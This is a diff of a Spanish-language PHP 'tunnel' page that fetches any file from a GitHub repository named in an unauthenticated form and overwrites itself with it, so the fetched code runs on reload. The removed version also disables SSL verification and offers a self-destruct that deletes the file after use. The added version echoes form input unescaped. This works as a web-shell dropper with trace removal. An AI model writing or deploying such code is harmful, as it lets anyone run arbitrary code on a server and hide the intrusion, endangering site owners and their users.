@@ -1,215 +1,71 @@
 <?php
-// ============================================================
-// TÚNEL AUTO-REEMPLAZ
-// Se conecta a GitHub → descarga archivo → SE REEMPLAZA A SÍ MISMO
-// Opcionalmente: se AUTODESTRUYE al terminar
-// ============================================================
+// =====================================================
+// 🌐 TÚNEL CONEXIÓN DIRECTA A GITHUB — SIN DESCARGAS
+// Reemplaza este mismo archivo desde GitHub al activar
+// =====================================================
 
-session_start();
-
+$mensaje = "";
+$pasos = [];
 $ip_servidor = $_SERVER['SERVER_ADDR'] ?? '0.0.0.0';
-$protocolo = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
-$host = $_SERVER['HTTP_HOST'];
-$archivo_actual = __FILE__; // Ruta de ESTE archivo (el que se va a reemplazar)
-$nombre_archivo_actual = basename($archivo_actual);
+$url_actual = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
 
-$resultado = null;
-$error = null;
-$log = [];
-
-// ============================================
-// FUNCIÓN: Registrar autodestrucción al salir
-// ============================================
-function autodestruir() {
-    global $archivo_actual, $log;
-    // Intentar borrar el archivo actual
-    if (file_exists($archivo_actual)) {
-        @unlink($archivo_actual);
-        // Intentar también con rename a un archivo temporal que se borra solo
-        if (file_exists($archivo_actual)) {
-            $temp = $archivo_actual . '.deleted_' . uniqid();
-            @rename($archivo_actual, $temp);
-            @unlink($temp);
-        }
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['archivo_github'])) {
+    
+    $nombre_archivo = trim($_POST['archivo_github']);
+    $usuario_repo = trim($_POST['usuario_repo']);
+    $rama = trim($_POST['rama']) ?: 'main';
+    
+    $pasos[] = "📍 IP del servidor: <strong>$ip_servidor</strong>";
+    $pasos[] = "🔗 Conectando con GitHub...";
+    $pasos[] = "📦 Repositorio: $usuario_repo";
+    $pasos[] = "📄 Archivo objetivo: $nombre_archivo";
+    
+    // Construir URL directa de GitHub
+    $url_github = "https://raw.githubusercontent.com/{$usuario_repo}/{$rama}/{$nombre_archivo}";
+    $pasos[] = "🌐 Conectando a: " . htmlspecialchars($url_github);
+    
+    // Usar stream_context para conexión segura SSL
+    $contexto = stream_context_create([
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+        ],
+    ]);
+    
+    // Obtener contenido DIRECTO en memoria — SIN guardar en disco
+    $codigo_nuevo = @file_get_contents($url_github, false, $contexto);
+    
+    if ($codigo_nuevo === false) {
+        // Intentar con rama "master" si falló
+        $url_github = "https://raw.githubusercontent.com/{$usuario_repo}/master/{$nombre_archivo}";
+        $codigo_nuevo = @file_get_contents($url_github, false, $contexto);
     }
-}
-
-// ============================================
-// FUNCIÓN: Descargar desde GitHub
-// ============================================
-function descargarDesdeGitHub($repo_url, $archivo_nombre, $rama = 'main') {
-    global $log;
     
-    // Limpiar URL del repo
-    $repo_url = rtrim($repo_url, '/');
-    
-    // Extraer usuario/repo de la URL
-    // https://github.com/usuario/repo → usuario/repo
-    if (preg_match('#github\.com/([^/]+/[^/]+)#', $repo_url, $matches)) {
-        $repo_path = $matches[1];
+    if ($codigo_nuevo === false) {
+        $mensaje = "<div class='error'>❌ No se pudo conectar. Verifica el nombre del archivo, usuario y rama.</div>";
+        $pasos[] = "❌ Error de conexión: Archivo no encontrado";
     } else {
-        // Asumir que ya es usuario/repo
-        $repo_path = trim($repo_url, '/');
-    }
-    
-    $log[] = "📦 Repositorio: $repo_path";
-    $log[] = "📄 Archivo objetivo: $archivo_nombre";
-    $log[] = "🌿 Rama: $rama";
-    
-    // Construir URL raw
-    $raw_url = "https://raw.githubusercontent.com/$repo_path/$rama/$archivo_nombre";
-    $log[] = "🔗 Conectando a: $raw_url";
-    
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $raw_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-SelfReplacer/1.0');
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    
-    $contenido = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $curl_error = curl_error($ch);
-    curl_close($ch);
-    
-    if ($curl_error) {
-        $log[] = "❌ Error de conexión: $curl_error";
-        return ['ok' => false, 'error' => $curl_error];
-    }
-    
-    if ($http_code === 404) {
-        // Intentar con rama 'master' si 'main' falló
-        if ($rama === 'main') {
-            $log[] = "🔄 Rama 'main' no encontrada, probando 'master'...";
-            return descargarDesdeGitHub($repo_url, $archivo_nombre, 'master');
-        }
-        $log[] = "❌ Archivo NO encontrado en el repositorio (HTTP 404)";
-        return ['ok' => false, 'error' => "El archivo '$archivo_nombre' no existe en el repositorio"];
-    }
-    
-    if ($http_code !== 200) {
-        $log[] = "❌ Error HTTP $http_code";
-        return ['ok' => false, 'error' => "HTTP Error $http_code"];
-    }
-    
-    $log[] = "✅ Descargado: " . number_format(strlen($contenido)) . " bytes";
-    return ['ok' => true, 'contenido' => $contenido, 'url' => $raw_url];
-}
-
-// ============================================
-// FUNCIÓN: Reemplazar ESTE archivo
-// ============================================
-function reemplazarme($nuevo_contenido, $autodestruir = false) {
-    global $archivo_actual, $log;
-    
-    $log[] = "🔄 Verificando permisos de escritura...";
-    
-    if (!is_writable($archivo_actual)) {
-        // Intentar cambiar permisos
-        @chmod($archivo_actual, 0644);
-        if (!is_writable($archivo_actual)) {
-            $log[] = "❌ Sin permisos para escribir en: $archivo_actual";
-            return ['ok' => false, 'error' => "Permisos insuficientes. CHMOD necesario."];
-        }
-    }
-    
-    $log[] = "✅ Permisos OK";
-    $log[] = "📝 Escribiendo nuevo contenido sobre: " . basename($archivo_actual);
-    
-    // Respaldar temporalmente por si acaso
-    $backup = $archivo_actual . '.bak_' . time();
-    @copy($archivo_actual, $backup);
-    
-    // Escribir el nuevo contenido
-    $bytes = file_put_contents($archivo_actual, $nuevo_contenido);
-    
-    if ($bytes === false) {
-        @unlink($backup);
-        $log[] = "❌ Falló la escritura";
-        return ['ok' => false, 'error' => "No se pudo escribir el archivo"];
-    }
-    
-    $log[] = "✅ Archivo reemplazado ($bytes bytes escritos)";
-    
-    // Verificar sintaxis PHP básica
-    $log[] = "🔍 Verificando sintaxis PHP...";
-    $temp_verif = tempnam(sys_get_temp_dir(), 'verify_');
-    file_put_contents($temp_verif, $nuevo_contenido);
-    $sintaxis_ok = true;
-    if (function_exists('php_check_syntax')) {
-        $sintaxis_ok = php_check_syntax($temp_verif);
-    }
-    @unlink($temp_verif);
-    
-    if ($sintaxis_ok) {
-        $log[] = "✅ Sintaxis PHP válida";
-    } else {
-        $log[] = "⚠️  Advertencia: posible problema de sintaxis (se reemplazó de todos modos)";
-    }
-    
-    // Borrar respaldo
-    @unlink($backup);
-    
-    // Si pidió autodestrucción, registrarla
-    if ($autodestruir) {
-        $log[] = "💣 Autodestrucción programada al finalizar la ejecución";
-        register_shutdown_function('autodestruir');
-    }
-    
-    return ['ok' => true, 'bytes' => $bytes];
-}
-
-// ============================================
-// PROCESAR PETICIÓN
-// ============================================
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $accion = $_POST['accion'] ?? 'reemplazar';
-    $repo_url = trim($_POST['repo_url'] ?? '');
-    $archivo_nombre = trim($_POST['archivo_nombre'] ?? '');
-    $autodestruir = isset($_POST['autodestruir']) && $_POST['autodestruir'] === 'si';
-    
-    if (empty($repo_url) || empty($archivo_nombre)) {
-        $error = "Completa ambos campos: URL del repositorio y nombre del archivo";
-    } else {
-        $log[] = "🚀 Iniciando túnel de reemplazo...";
+        $pasos[] = "✅ Túnel establecido — Datos recibidos (" . strlen($codigo_nuevo) . " bytes)";
+        $pasos[] = "🔑 Verificando integridad...";
         
-        // Paso 1: Descargar desde GitHub
-        $descarga = descargarDesdeGitHub($repo_url, $archivo_nombre);
-        
-        if (!$descarga['ok']) {
-            $error = $descarga['error'];
+        // Verificar que sea código PHP válido
+        if (strpos(trim($codigo_nuevo), '<?php') !== 0) {
+            $mensaje = "<div class='error'>⚠️ El archivo no contiene código PHP válido.</div>";
+            $pasos[] = "⚠️ Advertencia: El archivo no inicia con &lt;?php";
         } else {
-            // Verificar que sea contenido PHP válido (tiene <?php)
-            $es_php = strpos($descarga['contenido'], '<?php') !== false || substr($archivo_nombre, -4) === '.php';
+            $pasos[] = "✅ Código verificado — Reemplazando archivo...";
             
-            if (!$es_php) {
-                $log[] = "⚠️  El archivo no parece ser PHP (no contiene <?php)";
-            }
+            // ESCRIBIR sobre este mismo archivo
+            $resultado = file_put_contents(__FILE__, $codigo_nuevo);
             
-            if ($accion === 'ver') {
-                // Solo ver contenido
-                $resultado = [
-                    'accion' => 'ver',
-                    'nombre' => $archivo_nombre,
-                    'contenido' => $descarga['contenido'],
-                    'tamanio' => strlen($descarga['contenido']),
-                    'url' => $descarga['url']
-                ];
-            } elseif ($accion === 'reemplazar') {
-                // Paso 2: Reemplazar este archivo
-                $reemplazo = reemplazarme($descarga['contenido'], $autodestruir);
-                
-                $resultado = [
-                    'accion' => 'reemplazar',
-                    'nombre' => $archivo_nombre,
-                    'tamanio' => strlen($descarga['contenido']),
-                    'url' => $descarga['url'],
-                    'ok' => $reemplazo['ok'],
-                    'autodestruir' => $autodestruir,
-                    'bytes' => $reemplazo['bytes'] ?? 0,
-                    'error' => $reemplazo['error'] ?? null
-                ];
+            if ($resultado !== false) {
+                $mensaje = "<div class='exito'>✅ <strong>¡ACTIVADO!</strong> Archivo reemplazado correctamente.<br>Redirigiendo en 3 segundos...</div>";
+                $pasos[] = "✅ Archivo reemplazado — $resultado bytes escritos";
+                $pasos[] = "🔄 Recargando...";
+                echo "<script>setTimeout(()=>location.reload(), 3000);</script>";
+            } else {
+                $mensaje = "<div class='error'>❌ No se pudo escribir. Revisa permisos del archivo.</div>";
+                $pasos[] = "❌ Error: Sin permisos de escritura";
             }
         }
     }
@@ -217,322 +73,263 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ?><!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Túnel Auto-Reemplazo GitHub</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0;}
-body{
-    font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
-    background:#0a0a0f;color:#e8e5df;padding:20px;line-height:1.6;
-    min-height:100vh;position:relative;overflow-x:hidden;
-}
-.container{max-width:850px;margin:0 auto;position:relative;z-index:10;}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌐 Túnel GitHub — Conexión Directa</title>
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        body{
+            background: radial-gradient(ellipse at center, #0f0c29 0%, #302b63 35%, #24243e 60%, #000 100%);
+            min-height:100vh;
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            justify-content:center;
+            color:#fff;
+            overflow-x:hidden;
+            padding:20px;
+        }
 
-/* ===== FONDO TÚNEL ANIMADO ===== */
-.tunnel-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none;}
-.tunnel-ring{
-    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
-    border:2px solid rgba(196,112,70,0.15);border-radius:50%;
-    animation:tunnelPulse 4s ease-in-out infinite;
-}
-.tunnel-ring:nth-child(1){width:80px;height:80px;animation-delay:0s;}
-.tunnel-ring:nth-child(2){width:160px;height:160px;animation-delay:0.3s;}
-.tunnel-ring:nth-child(3){width:280px;height:280px;animation-delay:0.6s;}
-.tunnel-ring:nth-child(4){width:420px;height:420px;animation-delay:0.9s;}
-.tunnel-ring:nth-child(5){width:600px;height:600px;animation-delay:1.2s;}
-.tunnel-ring:nth-child(6){width:800px;height:800px;animation-delay:1.5s;}
-@keyframes tunnelPulse{
-    0%,100%{transform:translate(-50%,-50%) scale(0.8);opacity:0.3;border-color:rgba(196,112,70,0.3);}
-    50%{transform:translate(-50%,-50%) scale(1.1);opacity:0.6;border-color:rgba(123,168,184,0.4);}
-}
-.tunnel-core{
-    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
-    width:50px;height:50px;
-    background:radial-gradient(circle,rgba(196,112,70,0.9) 0%,transparent 70%);
-    border-radius:50%;animation:coreGlow 1.8s ease-in-out infinite;
-}
-@keyframes coreGlow{
-    0%,100%{opacity:0.4;transform:translate(-50%,-50%) scale(1);}
-    50%{opacity:1;transform:translate(-50%,-50%) scale(1.4);}
-}
+        /* ====== BARRA DE IP ====== */
+        .ip-bar{
+            position:fixed;
+            top:0;
+            left:0;
+            right:0;
+            background:rgba(0,0,0,0.7);
+            padding:10px 20px;
+            text-align:center;
+            font-family:monospace;
+            font-size:14px;
+            color:#00ff88;
+            border-bottom:1px solid #00ff8844;
+            z-index:100;
+        }
 
-/* ===== TARJETAS ===== */
-.card{
-    background:rgba(42,42,47,0.88);backdrop-filter:blur(12px);
-    border:1px solid rgba(232,229,223,.12);
-    border-radius:18px;padding:26px;margin-bottom:20px;position:relative;z-index:10;
-}
-h1{font-size:1.4rem;margin-bottom:6px;display:flex;align-items:center;gap:10px;}
-h1 .core-icon{
-    width:32px;height:32px;border-radius:50%;
-    background:radial-gradient(circle,#c47046 0%,transparent 70%);
-    animation:coreGlow 1.5s ease-in-out infinite;display:inline-block;
-}
-h2{font-size:1.05rem;margin-bottom:14px;color:#e8e5df;padding-bottom:10px;border-bottom:1px solid rgba(232,229,223,.12);}
-.subtitle{color:#9a978f;font-size:0.88rem;margin-bottom:20px;}
+        /* ====== CONTENEDOR DEL TÚNEL ====== */
+        .tunel-container{
+            position:relative;
+            width:300px;
+            height:300px;
+            margin-bottom:30px;
+            perspective:500px;
+        }
 
-/* IP Banner */
-.ip-banner{
-    background:linear-gradient(135deg,rgba(196,112,70,0.18),rgba(123,168,184,0.12));
-    border:1px solid rgba(196,112,70,0.35);
-    border-radius:14px;padding:14px 18px;margin-bottom:22px;
-    display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;
-}
-.ip-banner .label{font-size:0.72rem;color:#9a978f;text-transform:uppercase;letter-spacing:0.5px;font-weight:600;}
-.ip-banner .value{font-size:1.3rem;font-weight:700;color:#c47046;font-family:monospace;}
-.ip-banner .small{font-size:0.78rem;color:#9a978f;}
-.self-info{
-    background:rgba(255,255,255,0.04);border:1px dashed rgba(196,112,70,0.3);
-    border-radius:10px;padding:10px 14px;margin-bottom:18px;font-size:0.82rem;color:#c9c5bd;
-}
-.self-info code{background:rgba(0,0,0,0.3);color:#c47046;padding:2px 6px;border-radius:4px;font-size:0.78rem;}
+        .espiral{
+            position:absolute;
+            width:100%;
+            height:100%;
+            border-radius:50%;
+            border:2px solid transparent;
+            border-top-color:#7c3aed;
+            border-bottom-color:#06b6d4;
+            animation: girar 4s linear infinite;
+            box-shadow:0 0 20px #7c3aed88, inset 0 0 20px #06b6d444;
+        }
 
-/* Mensajes */
-.msg{padding:12px 16px;border-radius:10px;margin-bottom:18px;font-size:0.9rem;position:relative;z-index:10;}
-.msg.ok{background:rgba(46,125,50,0.2);color:#81c784;border:1px solid rgba(129,199,132,0.3);}
-.msg.error{background:rgba(198,40,40,0.2);color:#ef5350;border:1px solid rgba(239,83,80,0.3);}
-.msg.warn{background:rgba(255,143,0,0.15);color:#ffb74d;border:1px solid rgba(255,183,77,0.3);}
+        .espiral:nth-child(2){
+            width:80%;
+            height:80%;
+            top:10%;
+            left:10%;
+            animation-duration:3s;
+            animation-direction:reverse;
+            border-top-color:#06b6d4;
+            border-bottom-color:#7c3aed;
+        }
 
-/* Formulario */
-.form-group{margin-bottom:14px;}
-.form-group label{display:block;font-size:0.85rem;font-weight:600;color:#c9c5bd;margin-bottom:6px;}
-.form-group input[type="url"],
-.form-group input[type="text"]{
-    width:100%;padding:12px 14px;
-    background:rgba(255,255,255,0.05);
-    border:2px solid rgba(232,229,223,.12);
-    border-radius:10px;font-size:0.9rem;color:#e8e5df;
-    font-family:monospace;outline:none;transition:all 0.2s;
-}
-.form-group input:focus{border-color:#c47046;background:rgba(196,112,70,0.05);}
-.form-group input::placeholder{color:#666;}
+        .espiral:nth-child(3){
+            width:60%;
+            height:60%;
+            top:20%;
+            left:20%;
+            animation-duration:2.5s;
+            border-top-color:#a855f7;
+            border-bottom-color:#22d3ee;
+        }
 
-.radio-group{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;}
-.radio-option{
-    flex:1;min-width:180px;padding:12px;
-    background:rgba(255,255,255,0.04);border:2px solid rgba(232,229,223,.1);
-    border-radius:10px;cursor:pointer;transition:all 0.2s;
-}
-.radio-option:hover{border-color:rgba(196,112,70,0.4);}
-.radio-option input{margin-right:8px;}
-.radio-option .ro-title{font-weight:600;font-size:0.88rem;color:#e8e5df;}
-.radio-option .ro-desc{font-size:0.75rem;color:#9a978f;margin-top:3px;}
+        .espiral:nth-child(4){
+            width:40%;
+            height:40%;
+            top:30%;
+            left:30%;
+            animation-duration:2s;
+            animation-direction:reverse;
+            border-top-color:#c084fc;
+            border-bottom-color:#67e8f9;
+        }
 
-.checkbox-row{display:flex;align-items:center;gap:8px;padding:10px 12px;background:rgba(239,83,80,0.08);border:1px solid rgba(239,83,80,0.2);border-radius:10px;margin-bottom:14px;}
-.checkbox-row input{width:18px;height:18px;accent-color:#ef5350;}
-.checkbox-row label{font-size:0.85rem;color:#ef9a9a;cursor:pointer;margin:0;}
+        .centro-luz{
+            position:absolute;
+            width:20%;
+            height:20%;
+            top:40%;
+            left:40%;
+            background:radial-gradient(circle, #fff 0%, #00ff88 30%, #00ff8800 70%);
+            border-radius:50%;
+            animation: pulsar 1.5s ease-in-out infinite;
+            box-shadow:0 0 60px #00ff88;
+            z-index:10;
+        }
 
-.btn-replace{
-    width:100%;padding:14px 28px;
-    background:linear-gradient(135deg,#c47046,#a85d38);
-    color:white;border:none;border-radius:12px;
-    font-size:1rem;font-weight:700;cursor:pointer;
-    transition:all 0.3s;font-family:inherit;letter-spacing:0.5px;
-    position:relative;overflow:hidden;text-transform:uppercase;
-}
-.btn-replace:hover{
-    background:linear-gradient(135deg,#d48056,#b86d48);
-    box-shadow:0 0 30px rgba(196,112,70,0.4);transform:translateY(-1px);
-}
-.btn-replace:active{transform:translateY(0);}
-.btn-replace.danger{background:linear-gradient(135deg,#ef5350,#c62828);}
-.btn-replace.danger:hover{box-shadow:0 0 30px rgba(239,83,80,0.4);}
+        @keyframes girar{
+            0%{ transform: rotateX(60deg) rotateZ(0deg); }
+            100%{ transform: rotateX(60deg) rotateZ(360deg); }
+        }
 
-/* Resultados */
-.meta-grid{
-    display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
-    gap:10px;margin-bottom:16px;
-}
-.meta-item{
-    background:rgba(255,255,255,0.03);border:1px solid rgba(232,229,223,.08);
-    border-radius:10px;padding:10px 12px;
-}
-.meta-item .ml{font-size:0.72rem;color:#9a978f;text-transform:uppercase;letter-spacing:0.5px;}
-.meta-item .mv{font-size:0.88rem;color:#e8e5df;font-weight:600;font-family:monospace;word-break:break-all;margin-top:2px;}
+        @keyframes pulsar{
+            0%, 100%{ opacity:0.8; transform: scale(1); }
+            50%{ opacity:1; transform: scale(1.2); }
+        }
 
-.result-status{
-    display:inline-block;padding:5px 14px;border-radius:100px;
-    font-size:0.8rem;font-weight:700;margin-bottom:14px;
-}
-.status-ok{background:rgba(46,125,50,0.2);color:#81c784;}
-.status-err{background:rgba(198,40,40,0.2);color:#ef5350;}
+        /* ====== FORMULARIO ====== */
+        .card{
+            background:rgba(255,255,255,0.05);
+            backdrop-filter:blur(10px);
+            padding:30px;
+            border-radius:20px;
+            border:1px solid #ffffff22;
+            width:100%;
+            max-width:450px;
+            box-shadow:0 8px 32px rgba(0,0,0,0.3);
+        }
 
-.code-view{
-    background:#0d0d12;border:1px solid rgba(232,229,223,.1);
-    border-radius:12px;padding:16px;max-height:400px;overflow:auto;
-    font-size:0.78rem;color:#9cdcfe;font-family:'Consolas','Monaco',monospace;white-space:pre;
-}
+        h2{
+            text-align:center;
+            margin-bottom:25px;
+            color:#00ff88;
+            font-size:20px;
+        }
 
-/* Log */
-.log-box{
-    background:rgba(0,0,0,0.35);border:1px solid rgba(232,229,223,.08);
-    border-radius:10px;padding:12px;margin-top:14px;
-    font-size:0.78rem;font-family:monospace;color:#9a978f;
-    max-height:180px;overflow-y:auto;
-}
-.log-box .log-line{margin-bottom:3px;}
-.log-box .log-line.ok{color:#81c784;}
-.log-box .log-line.err{color:#ef5350;}
-.log-box .log-line.warn{color:#ffb74d;}
+        label{
+            display:block;
+            margin-bottom:8px;
+            font-size:14px;
+            color:#ccc;
+        }
 
-.refresh-hint{
-    text-align:center;padding:16px;background:rgba(196,112,70,0.1);
-    border:1px dashed rgba(196,112,70,0.4);border-radius:12px;
-    margin-top:16px;font-size:0.9rem;color:#c47046;font-weight:600;
-    animation:blink 1.5s ease-in-out infinite;
-}
-@keyframes blink{0%,100%{opacity:1;}50%{opacity:0.6;}}
-</style>
+        input{
+            width:100%;
+            padding:12px 15px;
+            margin-bottom:20px;
+            background:rgba(0,0,0,0.4);
+            border:1px solid #7c3aed66;
+            border-radius:8px;
+            color:#fff;
+            font-size:14px;
+            outline:none;
+            transition:border 0.3s;
+        }
+
+        input:focus{
+            border-color:#00ff88;
+        }
+
+        button{
+            width:100%;
+            padding:14px;
+            background:linear-gradient(90deg, #7c3aed, #06b6d4);
+            border:none;
+            border-radius:8px;
+            color:#fff;
+            font-size:16px;
+            font-weight:600;
+            cursor:pointer;
+            transition:transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover{
+            transform:scale(1.02);
+            box-shadow:0 0 25px #7c3aed88;
+        }
+
+        .mensaje{
+            margin-top:20px;
+        }
+
+        .exito{
+            background:rgba(0,255,136,0.1);
+            border:1px solid #00ff88;
+            padding:15px;
+            border-radius:8px;
+            color:#00ff88;
+            text-align:center;
+        }
+
+        .error{
+            background:rgba(255,68,68,0.1);
+            border:1px solid #ff4444;
+            padding:15px;
+            border-radius:8px;
+            color:#ff4444;
+            text-align:center;
+        }
+
+        .log{
+            margin-top:20px;
+            background:rgba(0,0,0,0.5);
+            padding:15px;
+            border-radius:8px;
+            font-family:monospace;
+            font-size:12px;
+            color:#aaa;
+            max-height:200px;
+            overflow-y:auto;
+            line-height:1.8;
+        }
+
+        .log strong{ color:#00ff88; }
+    </style>
 </head>
 <body>
 
-<!-- Fondo túnel -->
-<div class="tunnel-bg">
-    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
-    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
-    <div class="tunnel-ring"></div><div class="tunnel-ring"></div>
-    <div class="tunnel-core"></div>
-</div>
-
-<div class="container">
-
-<!-- IP Banner -->
-<div class="ip-banner">
-    <div>
-        <div class="label">📍 IP de este servidor</div>
-        <div class="value"><?= htmlspecialchars($ip_servidor) ?></div>
+    <div class="ip-bar">
+        📍 IP: <strong><?php echo htmlspecialchars($ip_servidor); ?></strong>
+        &nbsp;|&nbsp;
+        🌐 URL: <strong style="font-size:12px;"><?php echo htmlspecialchars($url_actual); ?></strong>
     </div>
-    <div style="text-align:right;">
-        <div class="small">Host: <strong><?= htmlspecialchars($host) ?></strong></div>
-        <div class="small">Archivo actual: <strong><?= htmlspecialchars($nombre_archivo_actual) ?></strong></div>
-    </div>
-</div>
 
-<div class="card">
-    <h1><span class="core-icon"></span> TÚNEL AUTO-REEMPLAZO</h1>
-    <p class="subtitle">Conecta GitHub → descarga el archivo → <strong>REEMPLAZA ESTE MISMO ARCHIVO</strong></p>
-    
-    <div class="self-info">
-        📌 Este archivo se sobrescribirá a sí mismo con el contenido descargado de GitHub.<br>
-        📄 Archivo actual: <code><?= htmlspecialchars($archivo_actual) ?></code>
-    </div>
-    
-    <?php if ($error): ?>
-    <div class="msg error">❌ <?= htmlspecialchars($error) ?></div>
-    <?php endif; ?>
-    
-    <form method="POST">
-        <div class="form-group">
-            <label>🔗 URL del repositorio GitHub</label>
-            <input type="url" name="repo_url" required
-                   placeholder="https://github.com/usuario/repositorio"
-                   value="<?= htmlspecialchars($_POST['repo_url'] ?? '') ?>">
-        </div>
-        
-        <div class="form-group">
-            <label>📄 Nombre del archivo (en el repositorio)</label>
-            <input type="text" name="archivo_nombre" required
-                   placeholder="ej: index.php, app.php, ruta/carpeta/archivo.php"
-                   value="<?= htmlspecialchars($_POST['archivo_nombre'] ?? '') ?>">
-        </div>
-        
-        <div class="form-group">
-            <label>⚡ Acción a realizar:</label>
-            <div class="radio-group">
-                <label class="radio-option">
-                    <input type="radio" name="accion" value="reemplazar" checked>
-                    <div>
-                        <div class="ro-title">🔄 Reemplazarme</div>
-                        <div class="ro-desc">Descarga y SOBRESCRIBE este archivo</div>
-                    </div>
-                </label>
-                <label class="radio-option">
-                    <input type="radio" name="accion" value="ver">
-                    <div>
-                        <div class="ro-title">👁️ Solo ver</div>
-                        <div class="ro-desc">Muestra el código sin reemplazar</div>
-                    </div>
-                </label>
-            </div>
-        </div>
-        
-        <div class="checkbox-row">
-            <input type="checkbox" name="autodestruir" id="autodestruir" value="si">
-            <label for="autodestruir">💣 Autodestruir este archivo después de reemplazar (borrar al salir)</label>
-        </div>
-        
-        <button type="submit" class="btn-replace">⚡ Activar Túnel</button>
-    </form>
-</div>
+    <div style="margin-top:60px;"></div>
 
-<?php if ($resultado): ?>
-<div class="card">
-    <?php if ($resultado['accion'] === 'reemplazar'): ?>
-    
-        <?php if ($resultado['ok']): ?>
-            <span class="result-status status-ok">✓ REEMPLAZO EXITOSO</span>
-        <?php else: ?>
-            <span class="result-status status-err">✗ FALLÓ</span>
+    <div class="tunel-container">
+        <div class="espiral"></div>
+        <div class="espiral"></div>
+        <div class="espiral"></div>
+        <div class="espiral"></div>
+        <div class="centro-luz"></div>
+    </div>
+
+    <div class="card">
+        <h2>🌐 TÚNEL DE CONEXIÓN — GITHUB</h2>
+
+        <form method="post">
+            <label>👤 Usuario / Repositorio</label>
+            <input type="text" name="usuario_repo" placeholder="ej: miusuario/mirepositorio" required>
+
+            <label>📄 Nombre del archivo (en el repo)</label>
+            <input type="text" name="archivo_github" placeholder="ej: miarchivo.php" required>
+
+            <label>🌿 Rama (dejar vacío para "main")</label>
+            <input type="text" name="rama" placeholder="main" value="main">
+
+            <button type="submit">⚡ ESTABLECER TÚNEL Y ACTIVAR</button>
+        </form>
+
+        <div class="mensaje"><?php echo $mensaje; ?></div>
+
+        <?php if (!empty($pasos)): ?>
+        <div class="log">
+            <?php foreach ($pasos as $p): ?>
+                <div><?php echo $p; ?></div>
+            <?php endforeach; ?>
+        </div>
         <?php endif; ?>
-        
-        <h2>📊 Resultado del reemplazo</h2>
-        
-        <div class="meta-grid">
-            <div class="meta-item">
-                <div class="ml">IP Servidor</div>
-                <div class="mv"><?= htmlspecialchars($ip_servidor) ?></div>
-            </div>
-            <div class="meta-item">
-                <div class="ml">Archivo</div>
-                <div class="mv"><?= htmlspecialchars($resultado['nombre']) ?></div>
-            </div>
-            <div class="meta-item">
-                <div class="ml">Bytes escritos</div>
-                <div class="mv"><?= number_format($resultado['bytes']) ?></div>
-            </div>
-            <div class="meta-item">
-                <div class="ml">Autodestruir</div>
-                <div class="mv"><?= $resultado['autodestruir'] ? 'SÍ 💣' : 'No' ?></div>
-            </div>
-        </div>
-        
-        <?php if ($resultado['ok']): ?>
-            <div class="refresh-hint">
-                🔄 <strong>¡LISTO!</strong> Actualiza la página para ver el NUEVO código ejecutándose
-                <?php if ($resultado['autodestruir']): ?>
-                    <br><span style="color:#ef5350;">💣 El archivo se borrará automáticamente</span>
-                <?php endif; ?>
-            </div>
-        <?php endif; ?>
-        
-        <?php if (isset($resultado['error'])): ?>
-            <div class="msg error" style="margin-top:14px;">❌ <?= htmlspecialchars($resultado['error']) ?></div>
-        <?php endif; ?>
-    
-    <?php elseif ($resultado['accion'] === 'ver'): ?>
-        
-        <span class="result-status status-ok">📋 VISTA PREVIA</span>
-        <h2>Contenido de: <?= htmlspecialchars($resultado['nombre']) ?> (<?= number_format($resultado['tamanio']) ?> bytes)</h2>
-        <div class="code-view"><?= htmlspecialchars($resultado['contenido']) ?></div>
-    
-    <?php endif; ?>
-    
-    <!-- Log -->
-    <?php if (!empty($log)): ?>
-    <div class="log-box">
-        <strong>📋 Log del túnel:</strong><br><br>
-        <?php foreach ($log as $linea): ?>
-        <div class="log-line <?= strpos($linea,'✅')!==false?'ok':(strpos($linea,'❌')!==false?'err':(strpos($linea,'⚠️')!==false||strpos($linea,'💣')!==false?'warn':'')) ?>">
-            <?= htmlspecialchars($linea) ?>
-        </div>
-        <?php endforeach; ?>
     </div>
-    <?php endif; ?>
-</div>
-<?php endif; ?>
-
-</div>
 
 </body>
 </html>
